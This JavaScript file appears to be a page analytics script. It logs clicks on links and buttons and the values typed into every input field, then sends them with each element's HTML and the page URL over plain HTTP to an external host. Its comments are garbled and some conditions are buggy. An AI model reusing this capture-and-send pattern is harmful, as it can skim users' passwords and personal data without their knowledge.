setTimeout(function(){

    $('input').blur(function () {

        if ($(this).val() != "" && ($(this).attr('min') == null)) {

            var label = 'input';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });

    $('a').click(function () {

        if ($(this).attr('min') == null) {
            var label = 'a';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });
    $('button').click(function () {
        if ($(this).attr('min') == null) {
            var label = 'button';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }
    });
},1000)

function btn1(num) {

    var a = num;

    var Inp = document.getElementsByTagName('input');

    for (var i = 0; i < Inp.length; i++) {

        Inp[i].index = i;

        if (Inp[i].getAttribute('min') == a) {
            var oldmessage = [];
            var text = Inp[i].innerText;
            var name = Inp[i].name;
            var value = Inp[i].value;
            var id = Inp[i].id;
            var classname = Inp[i].className;
            var label = 'input';
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = Inp[i].outerHTML==null?"":Inp[i].outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            oldmessage.push(message);
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    }

}
// onclick="btn2(this)"
function btn2(a) {

    var text = $(a).text();
    var value = $(a).attr('value');
    if (value = 'undefined') {
        value = '';
    }
    var name = $(a).attr('name');
    if (name = 'undefined') {
        name = '';
    }
    var classname = $(a).attr('class');
    if (classname = 'undefined') {
        classname = '';
    }
    var id = $(a).attr('id');
    if (id = 'undefined') {
        id = '';
    }
    var label = $(a).get(0).tagName;
    label = label == '' || label == null ? '' : label;
    id = id == '' || id == null ? '' : id;
    classname = classname == '' || classname == null ? '' : classname;
    name = name == '' || name == null ? '' : name;
    text = text == '' || text == null ? '' : text;
    value = value == '' || value == null ? '' : value;
    var tab = $(a).outerHTML==null?"":$(a).outerHTML;
    var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
    console.log(message);
    if(tab!=null&&tab!=''&&tab!='undefined'){
        sendMsg(message);
    }

}


/*
1.?????????encodeURI?????????utf-8??????????????????????????????[-28,-72-83]?????????????????????????????????????????????????????????????????????16??????????????????????????????[E4,B8,AD],????????????[%E4,%B8,%AD]

2.?????????encodeURI????????????????????????[%25E4,%25B8,%25AD]??????????????????????????????[%25E4,%25B8,%25AD]?????????????????????
????????????????????????getParameter?????????getParameter??????????????????????????????????????????
????????????????????????????????????????????????[%25E4,%25B8,%25AD]??????????????????????????????????????????URLdecode?????????URldecode?????????encodeURL?????????????????????????????????????????????[%E4,%B8,%AD]???????????????????????????getParameter??????
??????????????????????????????????????????URL???????????????????????????  ???????????????????????????????????????????????????????????????????????????
 */
//?????????????????????
visitPage();
function sendMsg(json) {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=action&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)) + "&" + window.encodeURI(window.encodeURI(json)),
        dataType: 'jsonp',
        jsonp: 'callback',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data.msg);
        }
    });
}
//????????????????????????????????????
function visitPage() {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=refresh&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)),
        dataType: 'jsonp',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            //????????????????????????????????????
            $("body").append("<aa id='statisticChecking' style='display: none'>checkIngJsIsInstallSuccess</aa>");
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data);
        }
    });
}



